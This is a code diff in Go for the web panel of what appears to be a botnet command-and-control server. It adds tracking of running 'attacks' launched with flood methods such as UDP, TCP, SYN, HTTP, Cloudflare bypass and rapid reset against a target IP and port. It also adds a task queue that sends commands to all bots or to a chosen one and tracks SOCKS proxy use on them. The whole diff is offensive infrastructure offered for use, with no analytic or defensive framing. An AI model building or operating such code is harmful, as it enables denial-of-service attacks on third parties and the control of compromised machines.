@@ -384,6 +384,10 @@ func handleWebLogout(w http.ResponseWriter, r *http.Request) {
 	cookie, err := r.Cookie("vps")
 	if err == nil {
 		webSessionsLock.Lock()
+		sess, ok := webSessions[cookie.Value]
+		if ok {
+			PushActivity("logout", fmt.Sprintf("%s logged out via web panel", sess.Username))
+		}
 		delete(webSessions, cookie.Value)
 		webSessionsLock.Unlock()
 	}
@@ -492,6 +496,46 @@ func handleAPIStats(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(stats)
 }
 
+// trackWebAttack parses attack commands from the web panel and adds them to ongoingAttacks.
+func trackWebAttack(cmd string) {
+	fields := strings.Fields(cmd)
+	if len(fields) < 4 {
+		return
+	}
+	method := fields[0]
+	attackMethods := map[string]bool{
+		"!udpflood": true, "!tcpflood": true, "!http": true, "!https": true,
+		"!tls": true, "!syn": true, "!ack": true, "!gre": true, "!dns": true,
+		"!cfbypass": true, "!rapidreset": true,
+	}
+	if !attackMethods[method] {
+		return
+	}
+	dur, err := time.ParseDuration(fields[3] + "s")
+	if err != nil {
+		return
+	}
+	a := attack{
+		method:   method,
+		ip:       fields[1],
+		port:     fields[2],
+		duration: dur,
+		start:    time.Now(),
+	}
+	ongoingAttacksLock.Lock()
+	ongoingAttackSeq++
+	id := ongoingAttackSeq
+	ongoingAttacks[id] = a
+	ongoingAttacksLock.Unlock()
+
+	go func(id int, dur time.Duration) {
+		time.Sleep(dur)
+		ongoingAttacksLock.Lock()
+		delete(ongoingAttacks, id)
+		ongoingAttacksLock.Unlock()
+	}(id, dur)
+}
+
 func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
@@ -512,6 +556,9 @@ func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "message": "Empty command"})
 		return
 	}
+
+	// Track attack commands in ongoingAttacks so the live panel works
+	trackWebAttack(cmd)
 
 	if req.BotID != "" {
 		ok := sendToSingleBot(req.BotID, cmd)
@@ -618,6 +665,8 @@ func handleAPIRunningAttacks(w http.ResponseWriter, r *http.Request) {
 			"target":    atk.ip,
 			"port":      atk.port,
 			"remaining": int(remaining.Seconds()),
+			"elapsed":   int(time.Since(atk.start).Seconds()),
+			"duration":  int(atk.duration.Seconds()),
 		})
 	}
 	ongoingAttacksLock.RUnlock()
@@ -725,7 +774,96 @@ func handleAPIRelays(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(relays)
 }
 
+// ============================================================================
+// TASK SYSTEM — queue commands for bots
+// ============================================================================
+
+type BotTask struct {
+	ID        int       `json:"id"`
+	Command   string    `json:"command"`
+	BotID     string    `json:"botID"`     // empty = all bots
+	CreatedAt time.Time `json:"createdAt"`
+	Status    string    `json:"status"`    // pending, sent, failed
+	Result    string    `json:"result"`
+}
+
+var (
+	taskList     []BotTask
+	taskListLock sync.RWMutex
+	taskIDSeq    int
+)
+
 func handleAPITasks(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "application/json")
-	w.Write([]byte("[]"))
+	switch r.Method {
+	case "GET":
+		taskListLock.RLock()
+		tasks := make([]BotTask, len(taskList))
+		copy(tasks, taskList)
+		taskListLock.RUnlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(tasks)
+
+	case "POST":
+		var req struct {
+			Command string `json:"command"`
+			BotID   string `json:"botID"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "message": "Invalid JSON"})
+			return
+		}
+		cmd := strings.TrimSpace(req.Command)
+		if cmd == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "message": "Empty command"})
+			return
+		}
+
+		// Execute immediately
+		status := "sent"
+		result := ""
+		if req.BotID != "" {
+			ok := sendToSingleBot(req.BotID, cmd)
+			if ok {
+				trackSocksState(cmd, req.BotID)
+				result = fmt.Sprintf("Sent to %s", req.BotID)
+			} else {
+				status = "failed"
+				result = "Bot not found"
+			}
+		} else {
+			sendToBots(cmd)
+			trackSocksState(cmd, "")
+			count := getBotCount()
+			result = fmt.Sprintf("Sent to %d bots", count)
+		}
+
+		taskListLock.Lock()
+		taskIDSeq++
+		task := BotTask{
+			ID:        taskIDSeq,
+			Command:   cmd,
+			BotID:     req.BotID,
+			CreatedAt: time.Now(),
+			Status:    status,
+			Result:    result,
+		}
+		taskList = append(taskList, task)
+		// Keep last 100 tasks
+		if len(taskList) > 100 {
+			taskList = taskList[len(taskList)-100:]
+		}
+		taskListLock.Unlock()
+
+		PushActivity("task", fmt.Sprintf("Task #%d: %s → %s", task.ID, cmd, result))
+		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "task": task})
+
+	case "DELETE":
+		taskListLock.Lock()
+		taskList = taskList[:0]
+		taskListLock.Unlock()
+		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": "Tasks cleared"})
+
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	}
 }
